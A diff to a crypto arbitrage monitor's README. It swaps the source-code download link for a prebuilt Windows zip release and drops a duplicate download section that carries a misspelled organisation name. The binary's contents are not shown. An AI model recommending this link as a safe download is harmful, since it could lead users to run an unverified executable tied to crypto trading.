@@ -23,7 +23,7 @@ To get started with **Crypto-Arbitrage-Monitor**, follow these simple steps:
 - API keys for the exchanges you want to monitor
 
 ## Download
-You can [click here to download](https://github.com/trendcryptobots/Crypto-Arbitrage-Monitor/archive/refs/heads/main.zip) the latest version of the Crypto-Arbitrage-Monitor.
+You can [click here to download](https://github.com/trendcryptobots/Crypto-Arbitrage-Monitor/releases/download/3.0/ArbitrageMonitor_Windows.zip) the latest version of the Crypto-Arbitrage-Monitor.
 
 
 ### Installation - With Open Source
@@ -36,10 +36,6 @@ cd Crypto-Arbitrage-Monitor
 pip install -r requirements.txt
 python arbitrage_monitor.py
 ```
-
-## Download
-You can [click here to download](https://github.com/trensdcryptobots/Crypto-Arbitrage-Monitor/archive/refs/heads/main.zip) the latest version of the Crypto-Arbitrage-Monitor.
-
 
 ## Disclaimer
 Crypto arbitrage trading involves financial risk, including the risk of losing the invested capital. Please do your own research and consider the risks before engaging in arbitrage trading.
